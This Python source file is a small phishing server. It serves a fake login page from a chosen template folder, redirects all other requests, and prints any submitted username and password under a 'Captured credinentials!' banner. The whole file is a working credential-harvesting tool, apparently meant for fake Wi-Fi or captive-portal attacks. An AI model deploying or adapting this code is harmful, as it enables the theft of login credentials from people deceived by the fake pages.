from http.server import BaseHTTPRequestHandler, HTTPServer, CGIHTTPRequestHandler
import cgi
import os
from modules.banner import bstring
import argparse
from datetime import date

parser = argparse.ArgumentParser()
parser.add_argument(
        "-t",
        "--template",
        type=str,
        required=True,
        help=("Template " +
            "Example: -t [template_name]"))

args = parser.parse_args()

template = args.template
HOST_NAME = '127.0.0.1'
# HOST_NAME = '10.0.0.1'
PORT = 80

class Server(BaseHTTPRequestHandler):

    def do_GET(self):
        
        if self.path == "/":
            self.path = '/templates/%s/index.html' % (template)
        else:
            self.path = '/templates/%s/redirect.html' % (template)

        f = open(self.path[1:]).read()
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(bytes(f, 'utf-8'))
        

        path = self.path
        # if self.path == '/':
        #     self.path = '/templates/%s/index.html' % (template)
        # try:
        #     split_path = os.path.splitext(self.path)
        #     request_extension = split_path[1]
        #     if request_extension != ".py":
        #         f = open(self.path[1:]).read()
        #         self.send_response(200)
        #         self.end_headers()
        #         self.wfile.write(bytes(f, 'utf-8'))
        #     else:
        #         f = "File not found"
        #         self.send_error(404,f)
        # except:
        #     f = "File not found"
        #     self.send_error(404,f)
        # path = self.path
        
    def do_POST(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        form = cgi.FieldStorage(
            fp=self.rfile, 
            headers=self.headers,
            environ={'REQUEST_METHOD':'POST',
                     'CONTENT_TYPE':self.headers['Content-Type'],
                     })
        username = form.getvalue("username")
        password = form.getvalue("password")
        print("\n" + bstring.CREDS, "Captured credinentials!")
        print("""
----------------------------
Username: """ + username + """
Password: """ + password + """
----------------------------
""")

if __name__ == "__main__":
    httpd = HTTPServer((HOST_NAME,PORT),Server)
    print("\n" + bstring.INFO, "Server started http://%s:%s" % (HOST_NAME,PORT))
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass

    httpd.server_close()
    print("\n" + bstring.INFO, "Server stopped")